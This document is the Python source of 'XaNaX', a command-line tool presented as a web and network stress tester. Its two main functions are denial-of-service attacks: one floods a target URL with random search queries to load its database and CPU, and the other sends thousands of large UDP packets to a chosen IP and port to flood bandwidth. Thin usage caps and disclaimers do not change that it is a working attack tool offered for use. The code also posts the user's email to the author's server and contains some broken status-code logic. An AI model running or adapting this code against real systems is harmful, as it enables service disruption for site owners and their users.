import os
import sys
from bs4 import BeautifulSoup
import requests
from requests.exceptions import ConnectionError
import re
import warnings
import time
import string
import random
import socket

warnings.filterwarnings('ignore')


def banner():
    print("""\033[0;36m
.-----.-----.-----.-----.-----.
|  X  |  a  |  N  |  a  |  X  |
'-----'-----'-----'-----'-----'\033[1;37m
             V1.0
\033[1m          
XaNaX: WEB & NETWORK STRESS TOOL
\033[0m
\033[1;32m        
Linkedin: Omid Nasiri pouya
Youtube / Instagram / Telegram / Twitter / Github : @Noob2Pr0
\033[1;37m
""")
    
def update():
    version = '1.0'
    server='https://omidnasiripouya.ir/MyTools/XaNaX/version.txt'
    update_request=requests
    orginal = update_request.get(server)
    answer = BeautifulSoup(orginal.content, 'html.parser')
    orginal_answer = answer.find_all('version')
    result = re.search('>(.*)<', str(orginal_answer))
    latest_version = str(result.group(1))
    if str(version) == latest_version:
        print ('\u001b[32mYour are using a Latest of version '+latest_version+'. thank you\u001b[37m')
        time.sleep(5)
    else:
        print('\u001b[31mYou are Using a out of date version of XaNax tool.\u001b[37m')
        print('Your Current Version '+version+' and latest version '+str(result))
        print('You can download new version of XaNaX with this links')
        print('\u001b[36mhttps://github.com/Noob2Pr0/XaNaX \u001b[37m')
        print('\u001b[36mhttps://omidnasiripouya.ir/MyTools/XaNaX/ \u001b[37m')
        time.sleep(5)

def clear_display():
    os.system("cls")


def rules():
    good = input('Hey buddy\nPlease do not use for bad purposes, OK ?: ')
    if 'ok' in good:
        print("Thank you ♥")
    else:
        print("""(Answer is OK :|)""")

def rules():
    print('''\u001b[31m
Any illegal use of this tool is your responsibility.
\u001b[33m
-------------------------------------------------
Warning: Security mechanisms may prevent this test from working properly. Of course, I think it's good :)
-------------------------------------------------\u001b[36m
It is recommended to use a stable connection with adequate bandwidth.
-------------------------------------------------\u001b[37m
    ''')
    qu = input('Have you read the rules and do you agree with them? (y=yes): \u001b[37m')
    if 'y' in qu:
        clear_display()
    else:
        sys.exit()



def s_end():
    print('''
Forgive me for writing my sorrows here!
Maybe it's because I don't have anyone or I think I don't have anyone but you
Maybe I need to use XaNaX !
A month ago I released my first public tool and asked my friends to try it
After 1 month, I am still waiting
While from Indonesia, England, Saudi Arabia, and several other countries,
my software was tested and they supported me by giving me their e-mails
Sometimes someone across the border is more of a friend than his friends
Hey friend, my tool is open source, you can change it and develop it, and you can check it completely from the point view of security.
I need your email only for the my new tools news and the count number of real users.
So if you follow me on social networks and enter your email in my tools, you have supported me
Anyway, thank you for reading all this text\033[0;31m ♥ \033[1;37m
--------------------------------------------
If you don't want to support me, leave the field empty
----------------------------------------------------''')
    
    email=input('\u001b[32mEnter Your Email: \u001b[37m')
    try:
        data2 = {"email": email}
        response2 = requests.post(Eurl, data=data2)
    except ConnectionError:
        print ('\u001b[31mConnection to the server fail.\u001b[37m')
        print('Please check you internet connection')
        sys.exit(141)
    if email==None:
        pass
    else:
        print('Creating Profile for You Please Wait a Sec')
        if response2.status_code==200:
            print ('\u001b[32mConnection to the server successfuly.\u001b[37m')
            profile = open( 'XaNaX_Profile.ini', 'w' )
            profile.write(str(email)+'\n')
            profile.close()
            print ("""I created a profile for your email address\nso that you don't see this message again\nthe next time you open the software it won't bother you anymore.""")
            print("Thank you for supporing us \u001b[31m♥\u001b[37m")
            time.sleep(5)
        else:
            print ('\u001b[31mConnection to the server fail.\u001b[37m')
            print('Please check you internet connection')

def support():
    global Eurl
    Eurl = 'https://omidnasiripouya.ir/MyTools/XaNaX/Email.php'
    if os.path.exists("XaNaX_Profile.ini"):
        UR = open("XaNaX_Profile.ini", "r")
        URContent = UR.read()
        if '@' in str(URContent):
            cuser = os.getlogin()
            banner()
            print('Welcome ',cuser)
            time.sleep(2)
            try:
                data = {"email": URContent}
                response = requests.post(Eurl, data=data)
            except ConnectionError:
                print ('\u001b[31mConnection to the server fail.\u001b[37m')
                print('Please check you internet connection')
                sys.exit()
        else:
            s_end()
    else:
        s_end()




def dos_menu():
    print("""
1) Search Stress (send search querys to dos database and cpu of the server)
2) Heavy Packet Stress (send heavy packets to flood bandwith)
""")
#3) NEW
    global select
    select = int(input('wich one ?: '))

def checker():
    if select == 1:
        Search_Stress()
    if select == 2:
        Heavy_Packet_Attack()
    #if select == 3:
        #NEW()
    else:
        sys.exit()


def Search_Stress():
    print ("This choice is suitable for sites that are behind the cloud and are protected with Google Captcha.")
    print ("Warning: This attack involves the server's processor and database.")
    print ('------------------------------')
    print ('Example: https://site.com/?search=       OR    https://site.com/search?q=')
    global target
    target = input('Enter target uri: ')
    print ('Search Query number is limited to 1000 \nPlease do not change that this app just for stress test not dos attack')
    print('------------------------------')
    print('Default Timeout = 2 Sec')
    try:
        user_time = int(input('Enter 1-5 Time for timeout connection: '))
    except:
        user_time = 2
    # Set
    S = 5  
    smartagent = 'python/3.7'
    headers = {'User-Agent': str(smartagent)}
    print ('Default Number of Requests = 10')
    try:
        NLoop = int(input('Enter the number of requests sent: '))
    except:
        NLoop = 10


    if NLoop >= 1001:
        print ('The number you entered is too high\nYou may be a bad person, but I am not')
        sys.exit()
    else:
        x=1
        # Connection Check
        Connection_Check = requests.get(target, headers=headers)
        #print ('Connection Check: '+str(Connection_Check))
        http_code = re.search(r"([0-9])\w+",str(Connection_Check))
        #print(http_code[0])
        alive = [200,202,203,204,205,206,207,208,226,300,301,302,303,304,305,306,307,308,404]
        block = [400,401,403,405,406,407,408,409,410,411,412,413,414,415,416,417,418,421,422,423,424,425,426,427,428,429,431,451]
        down = [501,502,503,504,505,506,507,508,510,511]
        if http_code in alive:
            print ('Target ALIVE')
        if http_code in block:
            print ('Target Blocked You.')
            sys.exit()
        if http_code in down:
            print ('Target is  DOWN')
            sys.exit()
        for x in range(NLoop):
            try:
                ran = ''.join(random.choices(string.ascii_lowercase, k = S)) 
                print('Send '+str(x+1)+': '+target+str(ran))
                Q1 = requests.get(target+str(ran), headers=headers,timeout=user_time)
                http_code = re.search(r"([0-9])\w+",str(Q1))
                print('HTTP CODE: ',http_code[0],' TIME: ',Q1.elapsed.total_seconds())
                x+=1
            except:
                print('server does not respond !')
                pass
    check_alive = re.search(r'http(.*)\/',target)
    print('---------------------[HTTP CHECK]-------------------------')
    print('\033[1;32mhttps://check-host.net/check-http?host='+check_alive[0])
    print('\033[1;37m---------------------[PING CHECK]-------------------------')
    print('\033[1;32mhttps://check-host.net/check-ping?host='+check_alive[0])
    print('\033[1;37m')

def Heavy_Packet_Attack():
    print("""This Test is more effective on UDP protocols, and if you send to TCP protocols,
    you will only occupy the bandwidth of the server, which must also have a high bandwidth.""")
    
    target = input('Enter target IP: ')
    
    try:
        print('Default Port is (HTTPS = 443)')
        port = int(input('Enter Port:'))
    except:
        port = 443
    
    try:
        print ('Default Mesaage Length is 10000 = 9.7 Kb')
        Message_len = int(input('Enter Length: '))
    except:
        Message_len = 10000
    if Message_len >= 100001:
        print ('Are you sure you have good intentions? ')
        sys.exit()
    else:
        pass
    
    try:
        number = int(input('How many Packet you want to send ? (Default = 10000): '))
    except:
        number = 10000
    
    print("UDP target IP:", target)
    print("UDP target port:", port)
    ran = ''.join(random.choices(string.ascii_lowercase, k = Message_len))
    garbage_msg = bytes(ran,encoding='utf8')
    print("message: is heavy to show ")
    
    UDP_IP = bytearray(target,encoding="ascii")
    
    
    print ('Sending 10000 Packet :\n')
    for x in range(number):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
        sock.sendto(garbage_msg, (UDP_IP, port))
        print ('Send Packet '+str(x+1)+' >>> ['+target+':'+str(port)+']')
    print('\033[1;37m---------------------[PING CHECK]-------------------------')
    print('\033[1;32mhttps://check-host.net/check-ping?host='+target)
    print('\033[1;37m')

clear_display()
update()
rules()
support()
clear_display()
banner()
dos_menu()
checker()


